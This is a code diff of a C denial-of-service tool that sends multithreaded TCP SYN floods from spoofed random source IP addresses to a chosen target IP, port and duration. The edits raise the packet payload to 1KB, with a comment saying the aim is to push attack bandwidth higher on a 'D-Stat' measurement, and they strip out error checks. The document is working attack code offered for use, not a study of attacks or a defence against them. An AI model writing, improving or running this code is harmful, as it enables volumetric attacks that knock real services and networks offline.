@@ -9,7 +9,6 @@
 #include <unistd.h>
 #include <time.h>
 
-// Structure for the pseudo-header (needed for TCP checksum)
 struct pseudo_header {
     u_int32_t source_address;
     u_int32_t dest_address;
@@ -24,11 +23,9 @@ typedef struct {
     int duration;
 } AttackArgs;
 
-// Standard Checksum Function
 unsigned short checksum(unsigned short *ptr, int nbytes) {
     long sum = 0;
     unsigned short oddbyte;
-    short answer;
     while (nbytes > 1) {
         sum += *ptr++;
         nbytes -= 2;
@@ -40,19 +37,14 @@ unsigned short checksum(unsigned short *ptr, int nbytes) {
     }
     sum = (sum >> 16) + (sum & 0xffff);
     sum = sum + (sum >> 16);
-    answer = (short)~sum;
-    return answer;
+    return (unsigned short)~sum;
 }
 
 void *flood(void *args) {
     AttackArgs *a = (AttackArgs *)args;
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    
     int one = 1;
-    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        perror("Error: Must run as root for raw sockets");
-        exit(1);
-    }
+    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
 
     char datagram[4096];
     struct iphdr *iph = (struct iphdr *) datagram;
@@ -64,9 +56,9 @@ void *flood(void *args) {
     sin.sin_port = htons(a->port);
     sin.sin_addr.s_addr = inet_addr(a->target_ip);
 
-    // Modern TCP Options length (20 bytes) + Random Payload (20 bytes)
+    // ENHANCEMENT: Large Payload (1KB) to increase MBPS on D-Stat
     int options_len = 20;
-    int payload_size = 20;
+    int payload_size = 1024; 
 
     while(1) {
         memset(datagram, 0, 4096);
@@ -76,9 +68,9 @@ void *flood(void *args) {
         iph->version = 4;
         iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + options_len + payload_size;
         iph->id = htons(rand() % 65535);
-        iph->ttl = 64 + (rand() % 64);
+        iph->ttl = 64;
         iph->protocol = IPPROTO_TCP;
-        iph->saddr = rand(); // RANDOM SPOOFED SOURCE IP
+        iph->saddr = rand(); 
         iph->daddr = sin.sin_addr.s_addr;
         iph->check = checksum((unsigned short *) datagram, sizeof(struct iphdr));
 
@@ -90,20 +82,18 @@ void *flood(void *args) {
         tcph->syn = 1;
         tcph->window = htons(65535);
 
-        // --- TCP Options (Matching your screenshot) ---
+        // --- Screenshot Options (SACK, TS, WScale) ---
         unsigned char *opt = (unsigned char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));
-        opt[0] = 2; opt[1] = 4; *((uint16_t*)(opt + 2)) = htons(1460); // MSS
-        opt[4] = 4; opt[5] = 2; // SACK OK
-        opt[6] = 8; opt[7] = 10; *((uint32_t*)(opt + 8)) = htonl(rand()); // TS Val
-        *((uint32_t*)(opt + 12)) = 0; // TSecr
-        opt[16] = 1; // NOP
-        opt[17] = 3; opt[18] = 3; opt[19] = 6; // WScale 6
+        opt[0] = 2; opt[1] = 4; *((uint16_t*)(opt + 2)) = htons(1460);
+        opt[4] = 4; opt[5] = 2; 
+        opt[6] = 8; opt[7] = 10; *((uint32_t*)(opt + 8)) = htonl(rand());
+        opt[17] = 3; opt[18] = 3; opt[19] = 6;
 
-        // --- Payload Randomization ---
+        // --- High Volumetric Payload ---
         unsigned char *payload = (unsigned char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + options_len);
         for(int i = 0; i < payload_size; i++) payload[i] = rand() % 256;
 
-        // --- Checksum Calculation ---
+        // --- Checksum ---
         psh.source_address = iph->saddr;
         psh.dest_address = iph->daddr;
         psh.placeholder = 0;
@@ -123,10 +113,9 @@ void *flood(void *args) {
 
 int main(int argc, char *argv[]) {
     if (argc != 5) {
-        printf("Usage: %s <Target IP> <Port> <Time> <Threads>\n", argv[0]);
+        printf("Usage: sudo %s <IP> <Port> <Time> <Threads>\n", argv[0]);
         return 1;
     }
-
     srand(time(NULL));
     AttackArgs args;
     strncpy(args.target_ip, argv[1], 16);
@@ -135,13 +124,12 @@ int main(int argc, char *argv[]) {
     int threads = atoi(argv[4]);
 
     pthread_t tid[threads];
-    printf("--- APEX 5/5 SYN FLOOD ACTIVE ON %s:%d ---\n", args.target_ip, args.port);
+    printf("--- APEX VOLUMETRIC SYN FLOOD STARTING ---\n");
 
     for (int i = 0; i < threads; i++) {
         pthread_create(&tid[i], NULL, flood, &args);
     }
 
     sleep(args.duration);
-    printf("--- SESSION COMPLETE ---\n");
     return 0;
 }
